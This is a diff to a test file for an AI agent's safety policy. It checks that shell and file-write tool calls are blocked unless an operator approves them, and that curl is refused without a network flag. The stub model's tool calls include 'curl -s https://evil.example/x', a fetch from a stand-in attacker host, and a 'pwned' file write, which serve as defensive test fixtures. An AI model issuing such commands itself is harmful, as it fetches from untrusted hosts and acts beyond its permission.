@@ -83,14 +83,67 @@ async function main() {
   const ans = await jarvB.ask('are satellites overhead right now?');
   check('ask() executed the handbook tool', calls === 2 && ans.toolCalls.length === 1 && ans.toolCalls[0].name === 'jarv_osint_handbook');
   check('ask() returned final reply', ans.reply === 'Handbook loaded — 7 OSINT tools ready.');
-  let askErr = null;
-  try { await jarvB.ask('hi'); } catch (e) { askErr = String((e && e.message) || e); }
-  // After loop consumed stub: complete now returns final immediately (calls goes 2→3), so no throw expected.
-  check('ask() without allowed turns still yields a reply', typeof ans.reply === 'string' && ans.reply.length > 0);
   check('ask() throws when AI relay missing', (() => {
     const bare = jarvAgent.makeJarvAgent({ pool: makeTinyPool(), ai: null, log: () => {} });
     return bare.ask('hi').then(() => false).catch((e) => /AI relay/.test(String(e.message)));
   })());
+
+  console.log('\n[7] JARV Safety Policy: autonomous tool gating');
+  check('policy exposes safe vs confirm tiers', jarvB.getPolicy && jarvB.getPolicy().safety.safeTools.includes('jarv_satvision') && jarvB.getPolicy().safety.confirmTools.includes('jarv_run'));
+  check('autonomous shell default OFF', jarvB.getPolicy().safety.autonomousShell === false);
+
+  let callSeq = [];
+  const blockAi = {
+    complete: async (args) => {
+      const seq = callSeq.length;
+      callSeq.push('turn' + seq);
+      if (seq === 0) {
+        return { ok: true, reply: '', tool_calls: [
+          { id: 'a1', type: 'function', function: { name: 'jarv_run', arguments: '{"command":"curl -s https://evil.example/x"}' } },
+          { id: 'a2', type: 'function', function: { name: 'jarv_write', arguments: '{"path":"note.txt","content":"pwned"}' } },
+        ] };
+      }
+      return { ok: true, reply: 'Both refused.', provider: 'stub', model: 'stub' };
+    },
+  };
+  const jarvD = jarvAgent.makeJarvAgent({ pool: makeTinyPool(), ai: blockAi, log: () => {} });
+  const blockAns = await jarvD.ask('do both things');
+  check('jarv_run blocked by policy (autonomous)', blockAns.blocked.length === 2 && blockAns.blocked.every((b) => b.reason === 'requires-operator-approval'));
+  check('policy refusal fed back to model (never executed)', (() => {
+    const feed = blockAns.toolCalls.map((t) => t.result.error || t.result.content || '').join(' ');
+    return /JARV_POLICY_BLOCK/.test(feed);
+  })());
+
+  const unlockAi = {
+    complete: async (args) => {
+      const seq = callSeq.length;
+      callSeq.push('turn' + seq);
+      if (seq === 0) {
+        return { ok: true, reply: '', tool_calls: [
+          { id: 'u1', type: 'function', function: { name: 'jarv_write', arguments: '{"path":"note.txt","content":"approved content"}' } },
+        ] };
+      }
+      return { ok: true, reply: 'Wrote the note.', provider: 'stub', model: 'stub' };
+    },
+  };
+  const jarvE = jarvAgent.makeJarvAgent({ pool: makeTinyPool(), ai: unlockAi, log: () => {} });
+  callSeq = [];
+  const unlocked = await jarvE.ask('write the note', { unlock: ['jarv_write'] });
+  check('operator-approved jarv_write runs', unlocked.blocked.length === 0 && unlocked.toolCalls[0].result.ok === true);
+
+  let callSeqShell = [];
+  const blockShellAi = {
+    complete: async (args) => {
+      if (callSeqShell.length === 0) {
+        callSeqShell.push(1);
+        return { ok: true, reply: '', tool_calls: [{ id: 's1', type: 'function', function: { name: 'jarv_run', arguments: '{"command":"curl -s https://x.example"}' } }] };
+      }
+      return { ok: true, reply: 'Asked to enable shell.', provider: 'stub', model: 'stub' };
+    },
+  };
+  const jarvF = jarvAgent.makeJarvAgent({ pool: makeTinyPool(), ai: blockShellAi, log: () => {} });
+  const shellUnlocked = await jarvF.ask('run curl please', { unlock: ['jarv_run'], allowShell: true });
+  check('approved jarv_run still refuses curl w/o network flag', shellUnlocked.blocked.length === 1 && /JARV_POLICY_BLOCK/.test(shellUnlocked.toolCalls[0].result.error) && /allowNet/.test(shellUnlocked.toolCalls[0].result.error) && /curl/.test(shellUnlocked.toolCalls[0].result.error));
 
   try { jarv.dispose && jarv.dispose(); } catch (e) {}
   fsRmdir(sandbox);
